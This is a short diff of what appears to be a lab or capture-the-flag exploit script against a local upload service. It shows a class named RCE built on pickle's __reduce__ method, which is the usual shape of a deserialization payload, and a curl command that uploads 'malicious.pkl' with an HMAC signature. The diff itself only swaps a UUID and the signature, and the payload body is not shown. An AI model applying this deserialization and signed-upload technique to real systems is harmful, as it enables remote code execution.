@@ -3,7 +3,7 @@
 import pickle, os, hashlib, hmac
 
 UPLOAD_DIR = "/app/app/uploads"
-uuid = "ab8ba41e-53a8-4b35-8e0b-fbfd4cbafaf8"
+uuid = "45deb27a-9f4c-44a5-97a3-8cbeeaf42410"
 
 class RCE:
     def __reduce__(self):
@@ -22,5 +22,5 @@ print(f"HMAC signature: {sig}")
 '''
 curl -X POST http://localhost:916/upload \
   -F "file=@malicious.pkl" \
-  -F "sig=7547b3173b1ce073d4a99658ea4cf95ad053f7180176cf84d8f2254be41d5430"  # requires correct sig here
+  -F "sig=d3f8bdfc1e23d6dab50105ead2bed3d55de116e6d588172a84ae9565c2ee800c"  # requires correct sig here
 '''
